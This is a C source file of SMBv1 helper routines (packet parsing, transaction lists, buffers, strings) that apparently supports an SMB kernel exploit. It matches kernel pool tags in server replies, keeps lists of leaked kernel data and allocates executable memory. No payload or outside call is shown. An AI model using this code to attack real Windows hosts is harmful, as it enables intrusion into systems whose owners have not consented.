#include "smb.h"
#pragma intrinsic(memset, memcpy, __nop)

#ifndef EXEC_ALLOC
#define EXEC_ALLOC
#endif // !EXEC_ALLOC

#pragma warning(push)
#pragma warning(disable : 4244 4715 6387)

static HCRYPTPROV hProv[1];

BOOL __cdecl __memcmp(const void* a, const void* b, DWORD size)
{
	register PBYTE pa = MAKEPBYTE(a), pb = MAKEPBYTE(b);
	while (size--)
		if (*(pa++) != *(pb++))
			return FALSE;
	return TRUE;
}

BOOL find_memory_pattern(BUFFER IN* bws, PANYPOINTER IN OUT result, const void* IN pattern, DWORD IN patternsize)
{
	DWORD offset = 0;
	BOOL ret = FALSE;

	result->pvpointer = bws->pbdata;
	for (offset = 0; offset < (bws->dwsize - patternsize); offset++)
	{
		if (cmp(result->pbpointer + offset, pattern, patternsize))
		{
			ret = TRUE;
			result->address += offset;
			break;
		}
	}

	return ret;
}

VOID update_smb_info(smb_info* info, BUFFER* IN newpacket)
{
	DWORD* dwnetbios = (DWORD*)newpacket->pbdata, * dwtagfrag = NULL, * dwtagfree = NULL, * dwtaglstr = NULL;
	WORD* nbtsize = (WORD*)(newpacket->pbdata + 2);
	PSMB_HEADER smb = MAKEPSMB(newpacket->pbdata + sizeof(DWORD));
	PREQ_NT_CREATE_ANDX ntcreatereq = NULL;
	PRESP_NT_CREATE_ANDX ntcreateresp = NULL;
	PREQ_TREE_CONNECT_ANDX treeandxreq = NULL;
	PREQ_SESSIONSETUP_ANDX sessionsetupreq = NULL;
	ANYPOINTER ptr = { 0 };
	static BUFFER varbuf;


	if (!cmp(smb->Protocol, "\xFFSMB", sizeof(smb->Protocol)))
	{
		errmsg(__FUNCSIG__, __LINE__, NT_STATUS_INVALID_SMB);
		return;
	}

	RtlZeroMemory(info->headerinfo, 32U);
	RtlCopyMemory(info->headerinfo, newpacket->pbdata + sizeof(DWORD), 32);

	ntcreatereq = (PREQ_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	ntcreateresp = (PRESP_NT_CREATE_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	treeandxreq = (PREQ_TREE_CONNECT_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);
	sessionsetupreq = (PREQ_SESSIONSETUP_ANDX)(newpacket->pbdata + SMB_PARAM_OFFSET);

	RtlCopyMemory(&info->pid, &smb->Pid, 2);
	RtlCopyMemory(&info->uid, &smb->Uid, 2);
	RtlCopyMemory(&info->tid, &smb->Tid, 2);
	RtlCopyMemory(&info->mid, &smb->Mid, 2);

	bwsalloc(&varbuf, sizeof(DWORD) * 0x80);
	dwtagfrag = ((DWORD*)(varbuf.pbdata));
	dwtaglstr = dwtagfree = dwtagfrag;
	dwtagfree++;
	dwtaglstr = dwtagfree;
	dwtaglstr++;

	if (smb->Status.NtStatus & STATUS_FAIL)
		PutUlong(&info->srv_last_error, smb->Status.NtStatus);

	switch (smb->Command)
	{
	case SMB_COM_SESSION_SETUP_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = sessionsetupreq->andx.AndxCommand;
			info->AndxOffset = sessionsetupreq->andx.AndxOffset;
		}



	case SMB_COM_TREE_CONNECT:			//if command is SMB_COM_TREE_CONNECT and isnt a reply copy the unc path
		if (!(smb->Flags & SMB_FLAGS_REPLY))
		{
			info->AndxCommand = treeandxreq->Andx.AndxCommand;
			info->AndxOffset = treeandxreq->Andx.AndxOffset;
			do
			{
				if (!find_memory_pattern(newpacket, &ptr, L"IPC$", sizeof(WCHAR) * 3))
					break;

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, L"\\\\", sizeof(WCHAR) * 2))
					break;

				InitUnicodeString(ptr.pwpointer, &info->tree_connection);

				RtlZeroMemory(&ptr, sizeof(ptr));

				if (!find_memory_pattern(newpacket, &ptr, "?????", 5))
					break;

				InitString(ptr.ppointer, &info->tree_connect_andx_svc);
			} while (FALSE);
		}
		break;
	case SMB_COM_NT_CREATE_ANDX:
		if (!(smb->Flags & SMB_FLAGS_REPLY))//request
		{
			info->AndxCommand = ntcreatereq->AndxCommand;
			info->AndxOffset = ntcreatereq->AndxOffset;
			break;
		}
		else//reply
		{
			info->AndxCommand = ntcreateresp->AndxCommand;
			RtlCopyMemory(&info->AndxOffset, &ntcreateresp->AndxOffset, sizeof(WORD));
			if (GetUshort(&ntcreateresp->Fid) & 0xFFFF)
				RtlCopyMemory(&info->fid, &ntcreateresp->Fid, sizeof(WORD));
			break;
		}

		//	*(&info->AndxCommand) = *(&ntcreatereq->AndxCommand);
		//	*(&info->AndxOffset) = *(&ntcreatereq->AndxOffset);
		//	if (info->fid & 0xFFFF)
		//		RtlCopyMemory(&info->fid, &ntcreateresp->Fid, 2);

	case SMB_COM_TRANS:
		*dwtagfrag = GetUlong("Frag");
		*dwtagfree = GetUlong("Free");
		*dwtaglstr = GetUlong("LStr");

		if (!(smb->Flags & SMB_FLAGS_REPLY))
			break;
		if (!find_memory_pattern(newpacket, &ptr, dwtagfrag, sizeof(DWORD)))
			*dwtagfrag = byteswap32(GetUlong("Frag"));

		if (!find_memory_pattern(newpacket, &ptr, "Frag", 4))
			if (!find_memory_pattern(newpacket, &ptr, "LStr", 4))
				break;
		if (find_memory_pattern(newpacket, &ptr, "Frag", 4))
			break;

	default:
		//RtlZeroMemory(&info->fid, 2);
		break;
	}
	bwsfree(&varbuf);
}

BOOL csprngcryptostartup(void)
{
	HCRYPTPROV* hp = hProv;
	PutUlongPtr(hp, NULL);

	if (!CryptAcquireContextW(hp, NULL, NULL, PROV_RSA_FULL, 0))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}
	return TRUE;
}

BOOL csprngcryptoshutdown(void)
{
	HCRYPTPROV* hp = hProv;

	if (GetUlongPtr(hp) == 0)
		return FALSE;

	if (!CryptReleaseContext(*hp, 0))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	PutUlongPtr(hp, 0);
	return TRUE;
}

void csprng(PBYTE buffer, DWORD size)
{
	HCRYPTPROV* hp = hProv;
	
	if(GetUlongPtr(hp) == 0)
		if (!CryptAcquireContext(hp, NULL, NULL, PROV_RSA_FULL, 0))
			errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	if (!CryptGenRandom(*hp, size, buffer))
		errmsg(__FUNCSIG__, __LINE__ - 1, GetLastError());
	//CryptReleaseContext(hp, 0);
}

unsigned int random(void)
{
	ULARGE_INTEGER out = { 0 };
	WORD wresult = 0;
	BYTE randbytes[0x10] = { 0 };
	ULARGE_INTEGER tickcnt = { 0 };

	csprng(randbytes, sizeof(randbytes));

	if (!GetUlongPtr(randbytes))
		return 0;

	RtlCopyMemory(&out, randbytes, sizeof(out));
	RtlZeroMemory(randbytes, sizeof(randbytes));

	tickcnt.QuadPart = GetTickCount64();

	if (tickcnt.QuadPart % 0x1000)
		PutUshort(&wresult, GetUshort(&out.HighPart));
	else if (!(tickcnt.QuadPart % 0x1000))
		PutUshort(&wresult, GetUshort(&out.LowPart));
	else
		PutUshort(&wresult, GetUshort(&out.QuadPart));

	return MAKEUNSIGNED(wresult);
}


BOOL __stdcall AllocateAndSetupTransactionReqList(TRANS_REQUEST_LIST** IN OUT listptr, DWORD IN count)
{
	SIZE_T size = (SIZE_T)(sizeof(TRANS_REQUEST_LIST) * count);
	PTRANS_REQUEST_LIST start = NULL, end = NULL, entry = NULL, next = NULL, previous = NULL;
	DWORD i = 0;

	if (isnull(listptr) || !GetUlong(&count))
		return FALSE;

	*listptr = ((PTRANS_REQUEST_LIST)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size)));

	if (isnull(*listptr))
		return FALSE;

	start = *listptr;
	end = &start[count - 1];

	for (i = 0; i < count; i++)
	{
		entry = start + i;
		previous = ((entry == start) ? (end) : (&start[i - 1]));
		next = ((entry == end) ? (start) : (&start[i + 1]));

		entry->Flink = next;
		entry->Blink = previous;
		entry->transtype = 0, entry->transactionfunction = 0;
		PutUlongPtr(&entry->smb, 0), PutUlongPtr(&entry->transaction, 0);
	}
	return TRUE;
}

BOOL __stdcall AllocateAndSetupTransactionRespList(TRANS_RESPONSE_LIST** IN OUT listptr, DWORD IN count)
{
	SIZE_T size = (SIZE_T)(sizeof(TRANS_RESPONSE_LIST) * count);
	PTRANS_RESPONSE_LIST start = NULL, end = NULL, entry = NULL, next = NULL, previous = NULL;
	DWORD i = 0;

	if (isnull(listptr) || !GetUlong(&count))
		return FALSE;

	*listptr = ((PTRANS_RESPONSE_LIST)(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size)));

	if (isnull(*listptr))
		return FALSE;

	start = *listptr;
	end = &start[count - 1];

	for (i = 0; i < count; i++)
	{
		entry = start + i;
		previous = ((entry == start) ? (end) : (&start[i - 1]));
		next = ((entry == end) ? (start) : (&start[i + 1]));

		entry->Flink = next;
		entry->Blink = previous;
		entry->transtype = 0, entry->transactionfunction = 0;

		PutUlongPtr(&entry->smb, 0), PutUlongPtr(&entry->transaction, 0);
	}
	return TRUE;
}

BOOL __stdcall FreeTransactionReqList(TRANS_REQUEST_LIST** IN OUT list)
{
	BOOL ret = 0;
	ret = HeapFree(GetProcessHeap(), 0, *list);
	*list = NULL;
	return ret;
}

BOOL __stdcall FreeTransactionRespList(TRANS_RESPONSE_LIST** IN OUT list)
{
	BOOL ret = 0;
	ret = HeapFree(GetProcessHeap(), 0, *list);
	*list = NULL;
	return ret;
}


BOOL __stdcall FillInTransRequestEntry(TRANS_REQUEST_LIST* entry, RequestPacketLinkedList* req)
{
	if (isnull(entry) || isnull(req))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}
	if (isnull(req->ThisPacket.pbdata) || isnull(req->ThisSmb))
	{
		SetLastError(STATUS_INVALID_PARAMETER | NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (req->ThisSmb->Flags & SMB_FLAGS_REPLY)
	{
		SetLastError(NT_STATUS_INVALID_SMB | STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (
		(req->ThisSmb->Command == SMB_COM_TRANS) ||
		(req->ThisSmb->Command == SMB_COM_TRANS2) ||
		(req->ThisSmb->Command == SMB_COM_TRANS_SECONDARY) ||
		(req->ThisSmb->Command == SMB_COM_TRANS2_SECONDARY) ||
		(req->ThisSmb->Command == SMB_COM_NT_TRANS)
		)
	{
		entry->smb = req->ThisSmb;
		entry->transtype = (DWORD)entry->smb->Command;
		entry->transaction.pvpointer = req->ThisPacket.pbdata + SMB_PARAM_OFFSET;
		return TRUE;
	}
	return FALSE;
}

BOOL __stdcall FillInTransResponseEntry(TRANS_RESPONSE_LIST* entry, ResponsePacketLinkedList* resp)
{
	if (isnull(entry) || isnull(resp))
	{
		SetLastError(STATUS_INVALID_PARAMETER);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}
	if (isnull(resp->ThisPacket.pbdata) || isnull(resp->ThisSmb))
	{
		SetLastError(STATUS_INVALID_PARAMETER | NT_STATUS_INVALID_SMB);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (!(resp->ThisSmb->Flags & SMB_FLAGS_REPLY))
	{
		SetLastError(NT_STATUS_INVALID_SMB | STATUS_FAIL);
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
		return FALSE;
	}

	if (
		(resp->ThisSmb->Command == SMB_COM_TRANS) ||
		(resp->ThisSmb->Command == SMB_COM_TRANS2) ||
		(resp->ThisSmb->Command == SMB_COM_TRANS_SECONDARY) ||
		(resp->ThisSmb->Command == SMB_COM_TRANS2_SECONDARY) ||
		(resp->ThisSmb->Command == SMB_COM_NT_TRANS)
		)
	{
		entry->smb = resp->ThisSmb;
		entry->transtype = (DWORD)entry->smb->Command;
		//PutUlongPtr(&entry->transaction.address, (GetUlongPtr(&resp->ThisPacket.pbdata + SMB_PARAM_OFFSET)));
		entry->transaction.pvpointer = resp->ThisPacket.pbdata + SMB_PARAM_OFFSET;
		return TRUE;
	}
	return FALSE;
}



BOOL __stdcall SyncTransactionInfo(TRANSACTION_INFORMATION* transinfo, BUFFER* IN packet)
{
	TRANS_REQUEST_LIST treq = { 0 };
	TRANS_RESPONSE_LIST tresp = { 0 };
	PSMB_HEADER h = NULL;
	ANYTRANSACTION_REQUEST* transactionreq = NULL;
	ANYTRANSACTION_RESPONSE* transactionresp = NULL;
	PVOID pvtmp = NULL;

	if (isnull(transinfo) || isnull(packet))
		return FALSE;

	h = MAKEPSMB(packet->pbdata + SMB_HEADER_OFFSET);
	RtlZeroMemory(transinfo, sizeof(TRANSACTION_INFORMATION));


	if (h->Flags & SMB_FLAGS_REPLY)
	{
		tresp.smb = h;
		tresp.transaction.pvpointer = (packet->pbdata + SMB_PARAM_OFFSET);
		tresp.transtype = h->Command;

		transactionresp = &tresp.transaction;


		if (h->Command != SMB_COM_TRANS && h->Command != SMB_COM_TRANS2 && h->Command != SMB_COM_NT_TRANS && h->Command != SMB_COM_TRANS_SECONDARY && h->Command != SMB_COM_TRANS2_SECONDARY)
		{
			SetLastError(STATUS_INVALID_PARAMETER);
			return FALSE;
		}

		if (h->Command == SMB_COM_TRANS)
		{
			transinfo->ByteCountOffset = 0;

			transinfo->SetupCount = tresp.transaction.trans->SetupCount;
			transinfo->WordCount = tresp.transaction.trans->WordCount;

			transinfo->DataCount = tresp.transaction.trans->DataCount;
			transinfo->ParameterCount = tresp.transaction.trans->ParameterCount;

			transinfo->DataDisplacement = tresp.transaction.trans->DataDisplacement;
			transinfo->ParameterDisplacement = tresp.transaction.trans->ParameterDisplacement;

			transinfo->ParameterOffset = tresp.transaction.trans->ParameterOffset;
			transinfo->DataOffset = tresp.transaction.trans->DataOffset;

			transinfo->TotalDataCount = tresp.transaction.trans->TotalDataCount;
			transinfo->TotalParameterCount = tresp.transaction.trans->TotalParameterCount;

		}
		else if (h->Command == SMB_COM_TRANS2)
		{
			pvtmp = transactionresp->trans2->Buffer;

			transinfo->ByteCountOffset = LOWORD(GetUlongPtr(&pvtmp) - GetUlongPtr(&packet->pbdata));
			transinfo->ByteCountOffset += LOWORD(transactionresp->trans2->SetupCount * sizeof(WORD));

			transinfo->SetupCount = tresp.transaction.trans2->SetupCount;
			transinfo->WordCount = tresp.transaction.trans2->WordCount;

			transinfo->DataCount = tresp.transaction.trans2->DataCount;
			transinfo->ParameterCount = tresp.transaction.trans2->ParameterCount;

			transinfo->DataDisplacement = tresp.transaction.trans2->DataDisplacement;
			transinfo->ParameterDisplacement = tresp.transaction.trans2->ParameterDisplacement;

			transinfo->ParameterOffset = tresp.transaction.trans2->ParameterOffset;
			//transinfo->DataOffset = tresp.transaction.trans2->

			//transinfo = tresp.transaction.trans2->ParameterOffset;
		}
		else //if (h->Command == SMB_COM_TRANS_SECONDARY)
		{
			return FALSE;
		}
	}
	else
	{
		treq.smb = h;
		treq.transaction.pvpointer = (packet->pbdata + SMB_PARAM_OFFSET);
		tresp.transtype = h->Command;

		transactionreq = &treq.transaction;

		if (h->Command != SMB_COM_TRANS && h->Command != SMB_COM_TRANS2 && h->Command != SMB_COM_NT_TRANS && h->Command != SMB_COM_TRANS_SECONDARY && h->Command != SMB_COM_TRANS2_SECONDARY)
		{
			SetLastError(STATUS_INVALID_PARAMETER);
			return FALSE;
		}

		if (h->Command == SMB_COM_TRANS)
		{
			pvtmp = transactionreq->trans->Buffer;

			transinfo->ByteCountOffset = LOWORD(GetUlongPtr(&pvtmp) - GetUlongPtr(&packet->pbdata));
			transinfo->ByteCountOffset += LOWORD(transactionreq->trans->SetupCount * sizeof(WORD));

			transinfo->SetupCount = treq.transaction.trans->SetupCount;
			transinfo->WordCount = treq.transaction.trans->WordCount;

			transinfo->DataCount = treq.transaction.trans->DataCount;
			transinfo->ParameterCount = treq.transaction.trans->ParameterCount;

			//			transinfo->DataDisplacement = treq.transaction.trans->
			//			transinfo->ParameterDisplacement = treq.transaction.trans->ParameterDisplacement;

			transinfo->ParameterOffset = treq.transaction.trans->ParameterOffset;
			transinfo->DataOffset = treq.transaction.trans->DataOffset;

			transinfo->TotalDataCount = treq.transaction.trans->TotalDataCount;
			transinfo->TotalParameterCount = treq.transaction.trans->TotalParameterCount;

			transinfo->MaxDataCount = treq.transaction.trans->MaxDataCount;
			transinfo->MaxParameterCount = treq.transaction.trans->MaxParameterCount;

			transinfo->Timeout = transactionreq->trans->Timeout;
		}
		else if (h->Command == SMB_COM_TRANS2)
		{
			pvtmp = &transactionreq->trans2->Buffer;

			transinfo->ByteCountOffset = LOWORD(GetUlongPtr(&pvtmp) - GetUlongPtr(&packet->pbdata));
			transinfo->ByteCountOffset += LOWORD(transactionreq->trans2->SetupCount * sizeof(WORD));

			transinfo->SetupCount = treq.transaction.trans2->SetupCount;
			transinfo->WordCount = treq.transaction.trans2->WordCount;
			transinfo->MaxSetupCount = treq.transaction.trans2->MaxSetupCount;

			transinfo->DataCount = treq.transaction.trans2->DataCount;
			transinfo->ParameterCount = treq.transaction.trans2->ParameterCount;

			transinfo->ParameterOffset = treq.transaction.trans2->ParameterOffset;
			transinfo->DataOffset = treq.transaction.trans2->DataOffset;

			transinfo->TotalDataCount = tresp.transaction.trans2->TotalDataCount;
			transinfo->TotalParameterCount = tresp.transaction.trans2->TotalParameterCount;

			transinfo->MaxDataCount = treq.transaction.trans2->MaxDataCount;
			transinfo->MaxParameterCount = treq.transaction.trans2->MaxParameterCount;
		}
		else if (h->Command == SMB_COM_TRANS_SECONDARY)
		{
			ANYPOINTER bytecntaddr = { 0 };
			bytecntaddr.pvpointer = &transactionreq->transsecondary->ByteCount;		//bytecntaddr.pvpointer = &treq.transaction.transsecondary->ByteCount;

			transinfo->ByteCountOffset = LOWORD(GetUlongPtr(&bytecntaddr.pbpointer) - GetUlongPtr(&packet->pbdata));
			transinfo->WordCount = treq.transaction.transsecondary->WordCount;

			transinfo->TotalDataCount = treq.transaction.transsecondary->TotalDataCount;
			transinfo->TotalParameterCount = treq.transaction.trans2->TotalParameterCount;

			transinfo->DataCount = treq.transaction.transsecondary->DataCount;
			transinfo->ParameterCount = treq.transaction.transsecondary->ParameterCount;

			transinfo->DataDisplacement = transactionreq->transsecondary->DataDisplacement;
			transinfo->ParameterDisplacement = transactionreq->transsecondary->ParameterDisplacement;
		}
		else if (h->Command == SMB_COM_TRANS2_SECONDARY)
		{
			__nop();
		}
		else
		{
			return FALSE;
		}
	}
	return TRUE;
}


void bwsalloc(BUFFER OUT* bws, DWORD IN size)
{
	SIZE_T siz = size;
	*bws = { 0 };
	bws->dwsize += size;
#ifdef EXEC_ALLOC
	bws->pbdata = MAKEPBYTE(VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE));
#else
	bws->pbdata = MAKEPBYTE(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, siz));
#endif // EXEC_ALLOC

	if (isnull(bws->pbdata))
	{
		errmsg(__FUNCSIG__, __LINE__, GetLastError() | STATUS_NO_MEMORY);
		return;
	}

	RtlZeroMemory(bws->pbdata, siz);
	return;
}

void bwsfree(BUFFER IN* bws)
{
#ifdef EXEC_ALLOC
	if (notnull(bws->pbdata))
		if (!VirtualFree(bws->pbdata, 0, MEM_RELEASE))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#else
	if (notnull(bws->pbdata))
		if (!HeapFree(GetProcessHeap(), 0, bws->pbdata))
			errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // EXEC_ALLOC
	RtlZeroMemory(bws, sizeof(BUFFER));
	return;
}

void bwscat(BUFFER IN OUT* dst, BUFFER IN* src)
{
	unsigned status[2] = { 0 };
	DWORD sizes[2] = { 0 }, * dstoldsize = sizes, * dstnewsize = sizes + 1;
	BUFFER tmp[2] = { 0 };

	if (isnull(dst) || isnull(src))
	{
		PutUnsigned(status, STATUS_INVALID_PARAMETER);
#ifdef _DEBUG
		dbgprint("[%S] invalid usage error: parameter \"%ws\" was %ws\n", __FUNCTION__, ((dst == NULL) ? TEXT("dst") : TEXT("src")), TEXT("(null)"));
#endif // _DEBUG
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return;
	}

	if (isnull(src->pbdata))
	{
		PutUnsigned(status, STATUS_INVALID_PARAMETER);
#ifdef _DEBUG
		dbgprint("[%S] invalid usage error: parameter \"%ws\" was %ws\n", __FUNCTION__, TEXT("src->pbdata"), TEXT("(null)"));
#endif // _DEBUG		
		SetLastError(GetUlong(status));
		errmsg(__FUNCSIG__, __LINE__, GetUlong(status));
		return;
	}

	if (!GetUlong(&dst->dwsize))
	{
		bwsalloc(dst, src->dwsize);
		cpy(dst->pbdata, src->pbdata, dst->dwsize);
	}
	else
	{
		//allocate and copy dest buffer to temp buffer
		bwsalloc(tmp, dst->dwsize);
		cpy(tmp->pbdata, dst->pbdata, tmp->dwsize);

		//free dest buffer
		bwsfree(dst);
		//allocate new dest buffer with size = oldsize + srcsize
		bwsalloc(dst, tmp->dwsize + src->dwsize);

		//copy from temp buffer to dest buffer 
		cpy(dst->pbdata, tmp->pbdata, tmp->dwsize);
		//copy from src buffer to dest buffer + tmp buffer size
		cpy(dst->pbdata + tmp->dwsize, src->pbdata, src->dwsize);

		bwsfree(tmp);
	}
	return;
}


void __stdcall FreeRequestLinkedListBuffers(RequestPacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	void* (__cdecl * alloc)(size_t) = NULL;
	void(__cdecl * afree)(void*) = NULL;
	alloc = (&malloc);
	afree = (&free);

	DWORD i = 0, j = 0;

	for (PutUlong(&j, 0); j < GetUlong(ListElementCount); j++)
	{
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;

		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}

	return;
}

void __stdcall FreeResponseLinkedListBuffers(ResponsePacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD i = 0, j = 0;
	for (PutUlong(&i, 0); i < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->ThisPacket.pbdata))
			bwsfree(&liststart->ThisPacket);
		if (notnull(liststart->ThisSmb))
			liststart->ThisSmb = NULL;
		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeLeakdataLinkedListBuffers(LeakedDataLinkedList* IN OUT liststart, DWORD* IN ListElementCount)
{
	DWORD dw[0x2] = { 0 }, * ii = (&dw[0]), & i = dw[0];
	for (PutUlong(ii, 0); GetUlong(ii) < GetUlong(ListElementCount); i++)
	{
		if (notnull(liststart->KrnlLeakResponse.pbdata))
			bwsfree(&liststart->KrnlLeakResponse);
		else
			continue;

		if (notnull(liststart->ResponseHeader))
			liststart->ResponseHeader = NULL;

		if (notnull(liststart->NextEntry))
			liststart = liststart->NextEntry;
		else
			break;
	}
	return;
}

void __stdcall FreeRequestLinkedListSingleEntry(RequestPacketLinkedList* IN OUT entrypointer)
{
	do {
		if (isnull(entrypointer))
			break;

		if (isnull(entrypointer->ThisPacket.pbdata))
		{
			break;
		}
		else if (notnull(entrypointer->ThisPacket.pbdata))
		{
			bwsfree(&entrypointer->ThisPacket);
			entrypointer->ThisNetbiosSize = NULL,
				entrypointer->ThisSmb = NULL;
			break;
		}

	} while (FALSE);
	return;
}

void __stdcall FreeResponseLinkedListSingleEntry(ResponsePacketLinkedList* IN OUT entry)
{
	while ((1 | 2 | 4 | 8) % 2)
	{
		if (isnull(entry))
			break;
		if (notnull(entry->ThisNetbiosSize) && notnull(entry->ThisSmb))
		{
			entry->ThisNetbiosSize = NULL;
			entry->ThisSmb = NULL;
		}
		if (notnull(entry->ThisPacket.pbdata))
			bwsfree(&entry->ThisPacket);
		break;
	}
}


void __stdcall InitString(PCSTR IN cstr, STRING* IN OUT str)
{
	SIZE_T length = strlen(cstr), size = strlen(cstr) + sizeof(char);

	RtlZeroMemory(str, sizeof(STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
	return;
}

void __stdcall FreeString(STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(STRING));
}

void __stdcall InitUnicodeString(PCWSTR IN cstr, UNICODE_STRING* IN OUT str)
{
	SIZE_T length = wcslen(cstr) * 2, size = ((wcslen(cstr) * sizeof(wchar_t)) + sizeof(wchar_t));

	RtlZeroMemory(str, sizeof(UNICODE_STRING));

	str->Length = LOWORD(length);
	str->MaximumLength = LOWORD(size);
	str->Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, size);

	if (isnull(str->Buffer))
	{
#ifdef _DEBUG
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
#endif // _DEBUG
		return;
	}

	RtlZeroMemory(str->Buffer, size);
	RtlCopyMemory(str->Buffer, cstr, length);
}

void __stdcall FreeUnicodeString(UNICODE_STRING* IN OUT str)
{
	if (isnull(str->Buffer))
		return;
	if (!HeapFree(GetProcessHeap(), 0, str->Buffer))
		errmsg(__FUNCSIG__, __LINE__, GetLastError());
	RtlZeroMemory(str, sizeof(UNICODE_STRING));
}

void __stdcall ConvertStringToUnicode(STRING* IN s, UNICODE_STRING* IN OUT u)
{
#pragma warning(push)
#pragma warning(disable : 6305)
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T alength = 0, wlength = 0, asize = 0, wsize = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000);

	alength += s->Length;
	asize += s->MaximumLength;

	wlength = (alength * sizeof(WCHAR));
	wsize = (alength + sizeof(WCHAR));

	wsprintfW(any->pwpointer, L"%S", s->Buffer);

	if (wlength != wcslen(MAKEPCWSTR(any->pwpointer)))
		wlength = wcslen(any->pwpointer);

	wsize = wlength + sizeof(WCHAR);

	InitUnicodeString(any->pwpointer, u);
	HeapFree(heap, 0, pv);
#pragma warning(pop)
}

void __stdcall ConvertUnicodeToString(UNICODE_STRING* IN u, STRING* IN OUT s)
{
	PVOID pv = NULL;
	PANYPOINTER any = (PANYPOINTER)(&pv);
	SIZE_T wsize = 0, wlength = 0;
	HANDLE heap = GetProcessHeap();

	pv = HeapAlloc(heap, HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, 0x1000 / 2);

	wlength += u->Length;
	wsize += u->MaximumLength;

	wsprintfA(any->ppointer, "%S", u->Buffer);
	InitString(any->ppointer, s);

	HeapFree(heap, 0, pv);
}

void DumpHex(const void* vdata, DWORD size)
{
	register BYTE* data = (BYTE*)vdata;
	char ascii[17];
	DWORD i = 0, j = 0;

	ascii[16] = '\0';

	for (i = 0; i < size; i++)
	{
		fprintf_s(stdout, "%02X ", MAKEUNSIGNED(data[i]));
		if (((data[i]) >= ' ') && (data[i] <= '~'))
		{
			ascii[i % 16] = *(char*)(data + i);
		}
		else
		{
			ascii[i % 16] = '.';
		}

		if ((i + 1) % 8 == 0 || (i + 1) == size)
		{
			fprintf(stdout, " ");
			if ((i + 1) % 16 == 0)
			{
				fprintf(stdout, "|  %s \n", ascii);

			}
			else if ((i + 1) == size)
			{
				ascii[(i + 1) % 16] = '\0';
				if ((i + 1) % 16 <= 8)
				{
					fprintf(stdout, " ");
				}
				for (j = (i + 1) % 16; j < 16; ++j)
				{
					fprintf(stdout, "   ");
				}
				fprintf(stdout, "|  %s \n", ascii);
			}
		}
	}
}

WORD get_pid(smb_info* i)
{
	return GetUshort(&i->pid);
}

WORD get_uid(smb_info* i)
{
	return GetUshort(&i->uid);
}

WORD get_mid(smb_info* i)
{
	return GetUshort(&i->mid);
}

WORD get_tid(smb_info* i)
{
	return GetUshort(&i->tid);
}

WORD get_fid(smb_info* i)
{
	return GetUshort(&i->fid);
}

WORD get_special_mid(smb_info* i)
{
	return GetUshort(&i->special_mid);
}

WORD get_special_pid(smb_info* i)
{
	return GetUshort(&i->special_pid);
}

void set_pid(smb_info* i, WORD pid)
{
	PutUshort(&i->pid, pid);
}

void set_uid(smb_info* i, WORD uid)
{
	PutUshort(&i->uid, uid);
}

void set_mid(smb_info* i, WORD mid)
{
	PutUshort(&i->mid, mid);
}

void set_tid(smb_info* i, WORD tid)
{
	PutUshort(&i->tid, tid);
}

void set_fid(smb_info* i, WORD fid)
{
	PutUshort(&i->fid, fid);
}

void set_special_mid(smb_info* i, WORD special_mid)
{
	PutUshort(&i->special_mid, special_mid);
}

void set_special_pid(smb_info* i, WORD special_pid)
{
	PutUshort(&i->special_pid, special_pid);
}



PBYTE negotiate_request_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid)
{
	PSMB_HEADER h = NULL;
